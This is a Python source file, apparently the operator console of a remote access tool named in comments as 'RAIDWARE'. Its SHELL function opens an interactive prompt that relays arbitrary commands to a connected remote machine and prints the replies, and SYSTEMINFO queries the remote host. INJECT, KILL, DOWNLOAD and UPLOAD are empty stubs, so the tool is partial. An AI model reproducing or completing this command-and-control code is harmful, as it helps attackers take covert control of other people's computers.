from CLI.utils.colors import log_error


def CLEAR(*args):
    from os import system, name
    system("cls" if name == "nt" else "clear")

class Handle:
    conn = None
    is_running = True
    _isExit = False

def EXIT(*args):
    Handle.is_running = False

def SHELL(*args):
    if Handle.conn == None:
        log_error("No connection has been established")
        return

    _isExit = False
    # Handle.conn.send("RAIDWARE-INTERACT")
    # buffer = Handle.conn.recv()

    # ''' Printing the prompt based on OS: '''
    # buffer = buffer.split('|')
    buffer = Handle.conn.pwd
    def update():
        if 'Windows' in Handle.conn.OS:
            return f"[{Handle.conn.pid}] {buffer}> "
        else:
            return f"{Handle.conn.user}:{buffer}$ "

    prompt = update()

    while True:
        try:
            cmd = input(prompt)
            if cmd == "":
                continue
            if cmd.lower() == "quit"  or cmd.lower() == "exit":
                Handle._isExit = True
                # Handle.conn.send("RAIDWARE-INTERACT-END")
                # rcv = Handle.conn.recv()
                # if rcv == "END-ACK":
                #     break
                # else:
                #     log_error("Unable to close the connection. Forcefully breaking out...")
                break

            if cmd.lower() == "clear" or cmd.lower() == "cls":
                CLEAR()
                continue

            curr = cmd.split()

            if curr[0].lower() == "put" or curr[0].lower() == "upload":
                print("UNIMPLEMENTED")
                continue

            if curr[0].lower() == "get" or curr[0].lower() == "download":
                print("UNIMPLEMENTED")
                continue

            Handle.conn.send(f"shell:{cmd}")
            rcv = Handle.conn.recv()
            if curr[0].lower() == "cd":
                if "Error" not in rcv:
                    buffer = rcv
                    prompt = update()
                    continue
                else:
                    pass
                
            print(rcv)
        except KeyboardInterrupt:
            print()
            if Handle._isExit:
                break
            if curr[0].lower() == "quit" or curr[0].lower() == "exit":
                break
            log_error("Please type \"[RED]EXIT[RESET]\" or \"[RED]QUIT[RESET]\" to break out of the shell.")
            continue
        except EOFError:
            print()
            if Handle._isExit:
                break
            if curr[0].lower() == "quit" or curr[0].lower() == "exit":
                break
            
            log_error("Please type \"[RED]EXIT[RESET]\" or \"[RED]QUIT[RESET]\" to break out of the shell.")
            continue

    pass

def DOWNLOAD(*args):
    pass

def UPLOAD(*args):
    pass

def INJECT(*args):
    pass

def KILL(*args):
    pass

def SYSTEMINFO(*args):
    if Handle.conn == None:
        log_error("No connection has been established")
        return
    Handle.conn.send(f"shell:systeminfo")
    rcv = Handle.conn.recv()
    print(rcv)